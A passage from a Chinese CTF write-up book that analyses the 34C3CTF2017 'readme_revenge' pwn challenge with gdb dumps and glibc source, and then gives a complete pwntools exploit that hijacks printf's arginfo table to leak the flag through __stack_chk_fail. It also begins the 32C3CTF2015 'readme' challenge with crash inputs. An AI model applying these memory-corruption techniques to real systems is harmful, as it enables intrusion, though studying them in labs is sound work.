| 0x00400a45 488d3d3bc708. lea rdi, str.Hi___s._
Bye. ; 0x48d187 ; "Hi, %s. Bye.\n"
| 0x00400a4c b800000000 mov eax, 0
| 0x00400a51 e87a6f0000 call sym.__printf
| 0x00400a56 b800000000 mov eax, 0
| 0x00400a5b 5d pop rbp
\ 0x00400a5c c3 ret
很简单，从标准输入读取字符串到变量 name ，地址在 0x6b73e0 ，且位于
.bss 段上，是一个全局变量。接下来程序调用 printf 将 name 打印出来。
在 gdb 里试试：
gdb-peda$ r  0xffffffff
RCX: 0x7fffffffd160 --> 0x0
RDX: 0x73 ('s')
RSI: 0x0
RDI: 0x48d18b ("%s. Bye.\n")
RBP: 0x0
RSP: 0x7fffffffd050 --> 0x0
RIP: 0x45ad64 (: cmp QWORD PTR
[rax+rdx*8],0x0)
R8 : 0x48d18b ("%s. Bye.\n")
R9 : 0x4
R10: 0x48d18c ("s. Bye.\n")
R11: 0x7fffffffd160 --> 0x0
R12: 0x0
R13: 0x7fffffffd190 --> 0xffffffff
R14: 0x48d18b ("%s. Bye.\n")
R15: 0x1
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT di
rection overflow)
[-------------------------------------code----------------------
---------------]
0x45ad53 : jmp 0x45ab95 
0x45ad58 : nop DWORD PTR [rax+ra
x*1+0x0]
0x45ad60 : movzx edx,BYTE PTR [r10
]
=> 0x45ad64 : cmp QWORD PTR [rax+rd
x*8],0x0
0x45ad69 : je 0x45a944 
0x45ad6f : lea rdi,[rsp+0x8]
0x45ad74 : mov rsi,rbx
0x45ad77 : addr32 call 0x44cfa0 
[------------------------------------stack----------------------
1092
6.1.13 pwn 34C3CTF2017 readme_revenge
---------------]
0000| 0x7fffffffd050 --> 0x0
0008| 0x7fffffffd058 --> 0x48d18c ("s. Bye.\n")
0016| 0x7fffffffd060 --> 0x0
0024| 0x7fffffffd068 --> 0x0
0032| 0x7fffffffd070 --> 0x7fffffffd5e0 --> 0x7fffffffdb90 --> 0
x7fffffffdc80 --> 0x4014a0 (: push r15
)
0040| 0x7fffffffd078 --> 0x7fffffffd190 --> 0xffffffff
0048| 0x7fffffffd080 --> 0x7fffffffd190 --> 0xffffffff
0056| 0x7fffffffd088 --> 0x443153 (:
mov r14,QWORD PTR [r12+0x20])
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000045ad64 in __parse_one_specmb ()
gdb-peda$ x/8gx &name
0x6b73e0 : 0x4141414141414141 0x41414141414141
41
0x6b73f0 : 0x4141414141414141 0x41414141414141
41
0x6b7400 : 0x4141414141414141 0x414141
4141414141
0x6b7410 : 0x4141414141414141 0x414141
4141414141
程序的漏洞很明显了，就是缓冲区溢出覆盖了 libc 静态编译到程序里的一些指针。
再往下看会发现一些可能有用的：
1093
6.1.13 pwn 34C3CTF2017 readme_revenge
gdb-peda$
0x6b7978 : 0x4141414141414141
gdb-peda$
0x6b7980 : 0x4141414141414141
gdb-peda$
0x6b7a28 : 0x4141414141414141
gdb-peda$
0x6b7a30 : 0x4141414141414141
gdb-peda$
0x6b7aa8 : 0x4141414141414141
gdb-peda$
0x6b7ab0 : 0x4141414141414141
再看一下栈回溯情况吧：
gdb-peda$ bt
#0 0x000000000045ad64 in __parse_one_specmb ()
#1 0x0000000000443153 in printf_positional ()
#2 0x0000000000446ed2 in vfprintf ()
#3 0x0000000000407a74 in printf ()
#4 0x0000000000400a56 in main ()
#5 0x0000000000400c84 in generic_start_main ()
#6 0x0000000000400efd in __libc_start_main ()
#7 0x000000000040092a in _start ()
依次调用了 printf() => vfprintf() => printf_positional() =>
__parse_one_specmb() 。那就看一下 glibc 源码，然后发现了这个：
// stdio-common/vfprintf.c
/* Use the slow path in case any printf handler is registered.
*/
if (__glibc_unlikely (__printf_function_table != NULL
|| __printf_modifier_table != NULL
|| __printf_va_arg_table != NULL))
goto do_positional;
1094
6.1.13 pwn 34C3CTF2017 readme_revenge
// stdio-common/printf-parsemb.c
/* Get the format specification. */
spec->info.spec = (wchar_t) *format++;
spec->size = -1;
if (__builtin_expect (__printf_function_table == NULL, 1)
|| spec->info.spec > UCHAR_MAX
|| __printf_arginfo_table[spec->info.spec] == NULL
/* We don't try to get the types for all arguments if the
format
uses more than one. The normal case is covered though. If
the call returns -1 we continue with the normal specifiers.
*/
|| (int) (spec->ndata_args = (*__printf_arginfo_table[spec
->info.spec])
(&spec->info, 1, &spec->data_arg_type,
&spec->size))  (int) UCHAR_MAX)
{
__set_errno (EINVAL);
return -1;
}
int result = 0;
__libc_lock_lock (lock);
if (__printf_function_table == NULL)
{
__printf_arginfo_table = (printf_arginfo_size_function **)
calloc (UCHAR_MAX + 1, sizeof (void *) * 2);
if (__printf_arginfo_table == NULL)
{
result = -1;
goto out;
}
__printf_function_table = (printf_function **)
(__printf_arginfo_table + UCHAR_MAX + 1);
}
__printf_function_table[spec] = converter;
__printf_arginfo_table[spec] = arginfo;
out:
__libc_lock_unlock (lock);
return result;
}
1097
6.1.13 pwn 34C3CTF2017 readme_revenge
然后发现 spec 被直接用做数组 __printf_function_table 和
__printf_arginfo_table 的下标。 s 也就是 0x73 ，这和我们在 gdb 里看
到的相符： rdx=0x73 ， [rax+rdx*8] 正好是数组取值的方式，虽然这里的
rax 里保存的是 __printf_modifier_table 。
漏洞利用
有了上面的分析，下面我们来构造 exp。
回顾一下 __parse_one_specmb() 函数里的 if 判断语句，我们知道 C 语言对
|| 的处理机制是如果第一个表达式为 True，就不再进行第二个表达式的判断，
所以为了执行函数 *__printf_arginfo_table[spec->info.spec] ，需要前面
的判断条件都为 False。我们可以在 .bss 段上伪造一个
printf_arginfo_size_function 结构体，在结构体偏移 0x73*8 的地方放上
__stack_chk_fail() 的地址，当该函数执行时，将打印出 argv[0] 指向的字
符串，所以我们还需要将 argv[0] 覆盖为 flag 的地址。
Bingo!!!
$ python2 exp.py
[+] Starting local process './readme_revenge': pid 14553
[*] Switching to interactive mode
*** stack smashing detected ***: 34C3_XXXXXXXXXXXXXXXXXXXXXXXXXX
XXXX terminated
exploit
完整的 exp 如下：
1098
6.1.13 pwn 34C3CTF2017 readme_revenge
from pwn import *
io = process('./readme_revenge')
flag_addr = 0x6b4040
name_addr = 0x6b73e0
argv_addr = 0x6b7980
func_table = 0x6b7a28
arginfo_table = 0x6b7aa8
stack_chk_fail = 0x4359b0
payload = p64(flag_addr) # name
payload = payload.ljust(0x73 * 8, "\x00")
payload += p64(stack_chk_fail) # __printf_arginfo_table[spec->i
nfo.spec]
payload = payload.ljust(argv_addr - name_addr, "\x00")
payload += p64(name_addr) # argv
payload = payload.ljust(func_table - name_addr, "\x00")
payload += p64(name_addr) # __printf_function_table
payload = payload.ljust(arginfo_table - name_addr, "\x00")
payload += p64(name_addr) # __printf_arginfo_table
# with open("./payload", "wb") as f:
# f.write(payload)
io.sendline(payload)
io.interactive()
参考资料
https://ctftime.org/task/5135
Customizing printf
1099
6.1.14 pwn 32C3CTF2015 readme
6.1.14 pwn 32C3CTF2015 readme
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file readme.bin
readme.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, fo
r GNU/Linux 2.6.24, BuildID[sha1]=7d3dcaa17ebe1662eec1900f735765
bd990742f9, stripped
$ checksec -f readme.bin
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
No RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 1 2 readme.b
in
开启了 Canary。
flag 就藏在二进制文件中的 .data 段上：
$ rabin2 -z readme.bin | grep 32C3
000 0x00000d20 0x00600d20 31 32 (.data) ascii 32C3_TheServerHa
sTheFlagHere...
程序接收两次输入，并打印出第一次输入的字符串（看起来并没有格式化字符串漏
洞）：
1100
6.1.14 pwn 32C3CTF2015 readme
$ ./readme.bin
Hello!
What's your name? %p.%p.%p.%p
Nice to meet you, %p.%p.%p.%p.
Please overwrite the flag: %d.%d.%d.%d
Thank you, bye!
$ python -c 'print "A"*300 + "\n" + "B"' > crash_input
$ ./readme.bin < crash_input
Hello!
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAA.
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***: ./readme.bin terminated
Aborted (core dumped)
$ python -c 'print "A" + "\n" + "B"*300' | ./readme.bin